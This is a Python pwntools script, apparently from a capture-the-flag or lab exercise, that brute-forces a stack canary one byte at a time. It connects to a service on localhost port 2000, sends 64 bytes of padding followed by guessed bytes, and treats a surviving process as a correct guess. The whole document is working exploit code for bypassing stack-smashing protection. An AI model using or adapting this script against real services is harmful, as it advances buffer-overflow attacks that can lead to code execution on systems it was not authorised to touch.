#!/usr/bin/python3

from pwn import *
import struct

PADDING = 64
canary = []

for cb in range(1):
    currentByte = 0x00
    for i in range(255):
        print(f"[+] Trying {hex(currentByte)} (Byte #{cb + 2})...")

        r = remote("localhost", 2000)
        DATA = b"A" * PADDING
        DATA += b"".join([struct.pack("B", c) for c in canary])
        DATA += struct.pack("B", currentByte)

        r.clean()
        r.send(DATA)

        received = b""
        try:
            received = r.recvuntil(b"analyzed?")
            print(received)
        except EOFError:
            print("Process Died")
        finally:
            r.close()

        if b"analyzed?" in received:
            canary.append(currentByte)
            print(f"\n[*] Byte #{cb + 2} is {hex(currentByte)}\n")
            currentByte = 0
            break
        else:
            currentByte += 1

print("Found Canary:")
print(" ".join([hex(c) for c in canary]))
